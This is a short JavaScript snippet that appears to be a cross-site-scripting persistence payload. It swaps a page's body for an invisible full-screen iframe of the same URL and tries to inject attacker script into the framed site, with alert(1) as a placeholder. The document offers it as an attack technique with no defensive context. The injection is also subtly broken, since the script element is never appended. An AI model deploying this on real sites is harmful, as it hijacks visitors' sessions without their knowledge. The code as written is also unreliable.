function inject_js(){
    var frame_document = document.getElementById('iframe').contentWindow.document
    var script_tag = frame_document.createElement('script');
    script_tag.innerHTML = "alert(1);" // <- this is the script that will be injected to entire website
}

var iframe_tag = '<iframe src="'+ location.href+ '" style="display:block; width:100vw; height: 100vh; border: none" id="iframe" onload="inject_js()"></iframe>';

document.getElementsByTagName('body')[0].innerHTML = iframe_tag // the website looks completely same as before
